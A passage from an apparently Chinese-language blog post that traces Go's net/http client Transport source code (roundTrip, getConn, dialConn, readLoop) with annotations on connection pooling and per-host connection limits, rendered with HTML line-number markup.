class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; roundTrip implements a RoundTripper over HTTP.</span><br><span class="line">func (t *Transport) roundTrip(req *Request) (*Response, error) &#123;</span><br><span class="line">t.nextProtoOnce.Do(t.onceSetNextProtoDefaults)</span><br><span class="line">ctx :&#x3D; req.Context()</span><br><span class="line">trace :&#x3D; httptrace.ContextClientTrace(ctx)</span><br><span class="line"></span><br><span class="line">if req.URL &#x3D;&#x3D; nil &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, errors.New(&quot;http: nil Request.URL&quot;)</span><br><span class="line">&#125;</span><br><span class="line">if req.Header &#x3D;&#x3D; nil &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, errors.New(&quot;http: nil Request.Header&quot;)</span><br><span class="line">&#125;</span><br><span class="line">scheme :&#x3D; req.URL.Scheme</span><br><span class="line">isHTTP :&#x3D; scheme &#x3D;&#x3D; &quot;http&quot; || scheme &#x3D;&#x3D; &quot;https&quot;</span><br><span class="line">if isHTTP &#123;</span><br><span class="line">for k, vv :&#x3D; range req.Header &#123;</span><br><span class="line">if !httpguts.ValidHeaderFieldName(k) &#123;</span><br><span class="line">return nil, fmt.Errorf(&quot;net&#x2F;http: invalid header field name %q&quot;, k)</span><br><span class="line">&#125;</span><br><span class="line">for _, v :&#x3D; range vv &#123;</span><br><span class="line">if !httpguts.ValidHeaderFieldValue(v) &#123;</span><br><span class="line">return nil, fmt.Errorf(&quot;net&#x2F;http: invalid header field value %q for key %v&quot;, v, k)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if t.useRegisteredProtocol(req) &#123;</span><br><span class="line">altProto, _ :&#x3D; t.altProto.Load().(map[string]RoundTripper)</span><br><span class="line">if altRT :&#x3D; altProto[scheme]; altRT !&#x3D; nil &#123;</span><br><span class="line">if resp, err :&#x3D; altRT.RoundTrip(req); err !&#x3D; ErrSkipAltProtocol &#123;</span><br><span class="line">return resp, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if !isHTTP &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, &amp;badStringError&#123;&quot;unsupported protocol scheme&quot;, scheme&#125;</span><br><span class="line">&#125;</span><br><span class="line">if req.Method !&#x3D; &quot;&quot; &amp;&amp; !validMethod(req.Method) &#123;</span><br><span class="line">return nil, fmt.Errorf(&quot;net&#x2F;http: invalid method %q&quot;, req.Method)</span><br><span class="line">&#125;</span><br><span class="line">if req.URL.Host &#x3D;&#x3D; &quot;&quot; &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, errors.New(&quot;http: no Host in request URL&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for &#123;</span><br><span class="line">select &#123;</span><br><span class="line">case &lt;-ctx.Done():</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, ctx.Err()</span><br><span class="line">default:</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; treq gets modified by roundTrip, so we need to recreate for each retry.</span><br><span class="line">treq :&#x3D; &amp;transportRequest&#123;Request: req, trace: trace&#125;</span><br><span class="line">cm, err :&#x3D; t.connectMethodForRequest(treq)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Get the cached or newly-created connection to either the</span><br><span class="line">&#x2F;&#x2F; host (for http or https), the http proxy, or the http proxy</span><br><span class="line">&#x2F;&#x2F; pre-CONNECTed to https server. In any case, we&#39;ll be ready</span><br><span class="line">&#x2F;&#x2F; to send it requests.</span><br><span class="line">&#x2F;&#x2F;重点是这个函数getConn</span><br><span class="line">pconn, err :&#x3D; t.getConn(treq, cm)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">t.setReqCanceler(req, nil)</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var resp *Response</span><br><span class="line">if pconn.alt !&#x3D; nil &#123;</span><br><span class="line">&#x2F;&#x2F; HTTP&#x2F;2 path.</span><br><span class="line">t.setReqCanceler(req, nil) &#x2F;&#x2F; not cancelable with CancelRequest</span><br><span class="line">resp, err &#x3D; pconn.alt.RoundTrip(req)</span><br><span class="line">&#125; else &#123;</span><br><span class="line">resp, err &#x3D; pconn.roundTrip(treq)</span><br><span class="line">&#125;</span><br><span class="line">if err &#x3D;&#x3D; nil &#123;</span><br><span class="line">return resp, nil</span><br><span class="line">&#125;</span><br><span class="line">if http2isNoCachedConnError(err) &#123;</span><br><span class="line">t.removeIdleConn(pconn)</span><br><span class="line">&#125; else if !pconn.shouldRetryRequest(req, err) &#123;</span><br><span class="line">&#x2F;&#x2F; Issue 16465: return underlying net.Conn.Read error from peek,</span><br><span class="line">&#x2F;&#x2F; as we&#39;ve historically done.</span><br><span class="line">if e, ok :&#x3D; err.(transportReadFromServerError); ok &#123;</span><br><span class="line">err &#x3D; e.err</span><br><span class="line">&#125;</span><br><span class="line">return nil, err</span><br><span class="line">&#125;</span><br><span class="line">testHookRoundTripRetried()</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Rewind the body if we&#39;re able to.</span><br><span class="line">if req.GetBody !&#x3D; nil &#123;</span><br><span class="line">newReq :&#x3D; *req</span><br><span class="line">var err error</span><br><span class="line">newReq.Body, err &#x3D; req.GetBody()</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return nil, err</span><br><span class="line">&#125;</span><br><span class="line">req &#x3D; &amp;newReq</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到主要是调用了getConn方法返回一个*persistConn类型的变量，继续跟进看看getConn是如何实现的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">func (t *Transport) getConn(treq *transportRequest, cm connectMethod) (pc *persistConn, err error) &#123;</span><br><span class="line">req :&#x3D; treq.Request</span><br><span class="line">trace :&#x3D; treq.trace</span><br><span class="line">ctx :&#x3D; req.Context()</span><br><span class="line">if trace !&#x3D; nil &amp;&amp; trace.GetConn !&#x3D; nil &#123;</span><br><span class="line">trace.GetConn(cm.addr())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">w :&#x3D; &amp;wantConn&#123;</span><br><span class="line">cm:         cm,</span><br><span class="line">key:        cm.key(),</span><br><span class="line">ctx:        ctx,</span><br><span class="line">ready:      make(chan struct&#123;&#125;, 1),</span><br><span class="line">beforeDial: testHookPrePendingDial,</span><br><span class="line">afterDial:  testHookPostPendingDial,</span><br><span class="line">&#125;</span><br><span class="line">defer func() &#123;</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">w.cancel(t, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&#x2F;&#x2F;尝试去空闲的连接池中寻找</span><br><span class="line">&#x2F;&#x2F;client针对每个host最多可以分别复用两个连接</span><br><span class="line">&#x2F;&#x2F; Queue for idle connection.</span><br><span class="line">if delivered :&#x3D; t.queueForIdleConn(w); delivered &#123;</span><br><span class="line">pc :&#x3D; w.pc</span><br><span class="line">if trace !&#x3D; nil &amp;&amp; trace.GotConn !&#x3D; nil &#123;</span><br><span class="line">trace.GotConn(pc.gotIdleConnTrace(pc.idleAt))</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; set request canceler to some non-nil function so we</span><br><span class="line">&#x2F;&#x2F; can detect whether it was cleared between now and when</span><br><span class="line">&#x2F;&#x2F; we enter roundTrip</span><br><span class="line">t.setReqCanceler(req, func(error) &#123;&#125;)</span><br><span class="line">return pc, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cancelc :&#x3D; make(chan error, 1)</span><br><span class="line">t.setReqCanceler(req, func(err error) &#123; cancelc &lt;- err &#125;)</span><br><span class="line">&#x2F;&#x2F;当没有在连接池中找到可用连接时，新建一个</span><br><span class="line">&#x2F;&#x2F; Queue for permission to dial.</span><br><span class="line">t.queueForDial(w)</span><br><span class="line">       &#x2F;&#x2F; Wait for completion or cancellation.</span><br><span class="line">select &#123;</span><br><span class="line">case &lt;-w.ready:</span><br><span class="line">&#x2F;&#x2F; Trace success but only for HTTP&#x2F;1.</span><br><span class="line">&#x2F;&#x2F; HTTP&#x2F;2 calls trace.GotConn itself.</span><br><span class="line">if w.pc !&#x3D; nil &amp;&amp; w.pc.alt &#x3D;&#x3D; nil &amp;&amp; trace !&#x3D; nil &amp;&amp; trace.GotConn !&#x3D; nil &#123;</span><br><span class="line">trace.GotConn(httptrace.GotConnInfo&#123;Conn: w.pc.conn, Reused: w.pc.isReused()&#125;)</span><br><span class="line">&#125;</span><br><span class="line">if w.err !&#x3D; nil &#123;</span><br><span class="line">&#x2F;&#x2F; If the request has been cancelled, that&#39;s probably</span><br><span class="line">&#x2F;&#x2F; what caused w.err; if so, prefer to return the</span><br><span class="line">&#x2F;&#x2F; cancellation error (see golang.org&#x2F;issue&#x2F;16049).</span><br><span class="line">select &#123;</span><br><span class="line">case &lt;-req.Cancel:</span><br><span class="line">return nil, errRequestCanceledConn</span><br><span class="line">case &lt;-req.Context().Done():</span><br><span class="line">return nil, req.Context().Err()</span><br><span class="line">case err :&#x3D; &lt;-cancelc:</span><br><span class="line">if err &#x3D;&#x3D; errRequestCanceled &#123;</span><br><span class="line">err &#x3D; errRequestCanceledConn</span><br><span class="line">&#125;</span><br><span class="line">return nil, err</span><br><span class="line">default:</span><br><span class="line">&#x2F;&#x2F; return below</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return w.pc, w.err</span><br><span class="line">case &lt;-req.Cancel:</span><br><span class="line">return nil, errRequestCanceledConn</span><br><span class="line">case &lt;-req.Context().Done():</span><br><span class="line">return nil, req.Context().Err()</span><br><span class="line">case err :&#x3D; &lt;-cancelc:</span><br><span class="line">if err &#x3D;&#x3D; errRequestCanceled &#123;</span><br><span class="line">err &#x3D; errRequestCanceledConn</span><br><span class="line">&#125;</span><br><span class="line">return nil, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们新建连接时，若没有在Client结构体所维护的连接池中找到可用的连接，那么就调用queueForDial方法，这里需要注意，当Transport没有设置MaxIdleConnsPerHost这个值的情况下，client针对每个不同的host所能维持的connection默认值为2。</p><p>接下来看看queueForDial方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">func (t *Transport) queueForDial(w *wantConn) &#123;</span><br><span class="line">w.beforeDial()</span><br><span class="line">if t.MaxConnsPerHost &lt;&#x3D; 0 &#123;</span><br><span class="line">go t.dialConnFor(w)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">t.connsPerHostMu.Lock()</span><br><span class="line">defer t.connsPerHostMu.Unlock()</span><br><span class="line"></span><br><span class="line">if n :&#x3D; t.connsPerHost[w.key]; n &lt; t.MaxConnsPerHost &#123;</span><br><span class="line">if t.connsPerHost &#x3D;&#x3D; nil &#123;</span><br><span class="line">t.connsPerHost &#x3D; make(map[connectMethodKey]int)</span><br><span class="line">&#125;</span><br><span class="line">t.connsPerHost[w.key] &#x3D; n + 1</span><br><span class="line">go t.dialConnFor(w)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if t.connsPerHostWait &#x3D;&#x3D; nil &#123;</span><br><span class="line">t.connsPerHostWait &#x3D; make(map[connectMethodKey]wantConnQueue)</span><br><span class="line">&#125;</span><br><span class="line">q :&#x3D; t.connsPerHostWait[w.key]</span><br><span class="line">q.cleanFront()</span><br><span class="line">q.pushBack(w)</span><br><span class="line">t.connsPerHostWait[w.key] &#x3D; q</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进dialConnFor方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">func (t *Transport) dialConnFor(w *wantConn) &#123;</span><br><span class="line">defer w.afterDial()</span><br><span class="line"></span><br><span class="line">pc, err :&#x3D; t.dialConn(w.ctx, w.cm)</span><br><span class="line">delivered :&#x3D; w.tryDeliver(pc, err)</span><br><span class="line">if err &#x3D;&#x3D; nil &amp;&amp; (!delivered || pc.alt !&#x3D; nil) &#123;</span><br><span class="line">&#x2F;&#x2F; pconn was not passed to w,</span><br><span class="line">&#x2F;&#x2F; or it is HTTP&#x2F;2 and can be shared.</span><br><span class="line">&#x2F;&#x2F; Add to the idle connection pool.</span><br><span class="line">t.putOrCloseIdleConn(pc)</span><br><span class="line">&#125;</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">t.decConnsPerHost(w.key)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟dialConn方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">func (t *Transport) dialConn(ctx context.Context, cm connectMethod) (pconn *persistConn, err error) &#123;</span><br><span class="line">&#x2F;&#x2F; 生成一个*persistConn对象</span><br><span class="line">pconn &#x3D; &amp;persistConn&#123;</span><br><span class="line">t:             t,</span><br><span class="line">cacheKey:      cm.key(),</span><br><span class="line">reqch:         make(chan requestAndChan, 1),</span><br><span class="line">writech:       make(chan writeRequest, 1),</span><br><span class="line">closech:       make(chan struct&#123;&#125;),</span><br><span class="line">writeErrCh:    make(chan error, 1),</span><br><span class="line">writeLoopDone: make(chan struct&#123;&#125;),</span><br><span class="line">&#125;</span><br><span class="line">trace :&#x3D; httptrace.ContextClientTrace(ctx)</span><br><span class="line">wrapErr :&#x3D; func(err error) error &#123;</span><br><span class="line">if cm.proxyURL !&#x3D; nil &#123;</span><br><span class="line">&#x2F;&#x2F; Return a typed error, per Issue 16997</span><br><span class="line">return &amp;net.OpError&#123;Op: &quot;proxyconnect&quot;, Net: &quot;tcp&quot;, Err: err&#125;</span><br><span class="line">&#125;</span><br><span class="line">return err</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;下面是连接代码</span><br><span class="line">if cm.scheme() &#x3D;&#x3D; &quot;https&quot; &amp;&amp; t.DialTLS !&#x3D; nil &#123;</span><br><span class="line">var err error</span><br><span class="line">pconn.conn, err &#x3D; t.DialTLS(&quot;tcp&quot;, cm.addr())</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return nil, wrapErr(err)</span><br><span class="line">&#125;</span><br><span class="line">if pconn.conn &#x3D;&#x3D; nil &#123;</span><br><span class="line">return nil, wrapErr(errors.New(&quot;net&#x2F;http: Transport.DialTLS returned (nil, nil)&quot;))</span><br><span class="line">&#125;</span><br><span class="line">if tc, ok :&#x3D; pconn.conn.(*tls.Conn); ok &#123;</span><br><span class="line">&#x2F;&#x2F; Handshake here, in case DialTLS didn&#39;t. TLSNextProto below</span><br><span class="line">&#x2F;&#x2F; depends on it for knowing the connection state.</span><br><span class="line">if trace !&#x3D; nil &amp;&amp; trace.TLSHandshakeStart !&#x3D; nil &#123;</span><br><span class="line">trace.TLSHandshakeStart()</span><br><span class="line">&#125;</span><br><span class="line">if err :&#x3D; tc.Handshake(); err !&#x3D; nil &#123;</span><br><span class="line">go pconn.conn.Close()</span><br><span class="line">if trace !&#x3D; nil &amp;&amp; trace.TLSHandshakeDone !&#x3D; nil &#123;</span><br><span class="line">trace.TLSHandshakeDone(tls.ConnectionState&#123;&#125;, err)</span><br><span class="line">&#125;</span><br><span class="line">return nil, err</span><br><span class="line">&#125;</span><br><span class="line">cs :&#x3D; tc.ConnectionState()</span><br><span class="line">if trace !&#x3D; nil &amp;&amp; trace.TLSHandshakeDone !&#x3D; nil &#123;</span><br><span class="line">trace.TLSHandshakeDone(cs, nil)</span><br><span class="line">&#125;</span><br><span class="line">pconn.tlsState &#x3D; &amp;cs</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">conn, err :&#x3D; t.dial(ctx, &quot;tcp&quot;, cm.addr())</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return nil, wrapErr(err)</span><br><span class="line">&#125;</span><br><span class="line">pconn.conn &#x3D; conn</span><br><span class="line">if cm.scheme() &#x3D;&#x3D; &quot;https&quot; &#123;</span><br><span class="line">var firstTLSHost string</span><br><span class="line">if firstTLSHost, _, err &#x3D; net.SplitHostPort(cm.addr()); err !&#x3D; nil &#123;</span><br><span class="line">return nil, wrapErr(err)</span><br><span class="line">&#125;</span><br><span class="line">if err &#x3D; pconn.addTLS(firstTLSHost, trace); err !&#x3D; nil &#123;</span><br><span class="line">return nil, wrapErr(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;省略一部分不重要的代码</span><br><span class="line">        &#x2F;&#x2F;重点来了</span><br><span class="line">pconn.br &#x3D; bufio.NewReaderSize(pconn, t.readBufferSize())</span><br><span class="line">pconn.bw &#x3D; bufio.NewWriterSize(persistConnWriter&#123;pconn&#125;, t.writeBufferSize())</span><br><span class="line">&#x2F;&#x2F;起了俩goroutine，一个负责在conn上读，一个负责写</span><br><span class="line">go pconn.readLoop()</span><br><span class="line">go pconn.writeLoop()</span><br><span class="line">return pconn, nil</span><br></pre></td></tr></table></figure><p>兜兜绕绕终于来到了关键的地方，在connection成功建立之后，可以看见启动了两个goroutine来负责读写<br>我们挑readloop来看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">func (pc *persistConn) readLoop() &#123;</span><br><span class="line">closeErr :&#x3D; errReadLoopExiting &#x2F;&#x2F; default value, if not changed below</span><br><span class="line">defer func() &#123;</span><br><span class="line">pc.close(closeErr)</span><br><span class="line">pc.t.removeIdleConn(pc)</span><br><span class="line">&#125;()</span><br><span class="line">tryPutIdleConn :&#x3D; func(trace *httptrace.ClientTrace) bool &#123;</span><br><span class="line">if err :&#x3D; pc.t.tryPutIdleConn(pc); err !&#x3D; nil &#123;</span><br><span class="line">closeErr &#x3D; err</span><br><span class="line">if trace !&#x3D; nil &amp;&amp; trace.PutIdleConn !&#x3D; nil &amp;&amp; err !&#x3D; errKeepAlivesDisabled &#123;</span><br><span class="line">trace.PutIdleConn(err)</span><br><span class="line">&#125;</span><br><span class="line">return false</span><br><span class="line">&#125;</span><br><span class="line">if trace !&#x3D; nil &amp;&amp; trace.PutIdleConn !&#x3D; nil &#123;</span><br><span class="line">trace.PutIdleConn(nil)</span><br><span class="line">&#125;</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; eofc is used to block caller goroutines reading from Response.Body</span><br><span class="line">&#x2F;&#x2F; at EOF until this goroutines has (potentially) added the connection</span><br><span class="line">&#x2F;&#x2F; back to the idle pool.</span><br><span class="line">eofc :&#x3D; make(chan struct&#123;&#125;)</span><br><span class="line">defer close(eofc) &#x2F;&#x2F; unblock reader on errors</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Read this once, before loop starts. (to avoid races in tests)</span><br><span class="line">testHookMu.Lock()</span><br><span class="line">testHookReadLoopBeforeNextRead :&#x3D; testHookReadLoopBeforeNextRead</span><br><span class="line">testHookMu.Unlock()</span><br><span class="line"></span><br><span class="line">alive :&#x3D; true</span><br><span class="line">for alive &#123;</span><br><span class="line">pc.readLimit &#x3D; 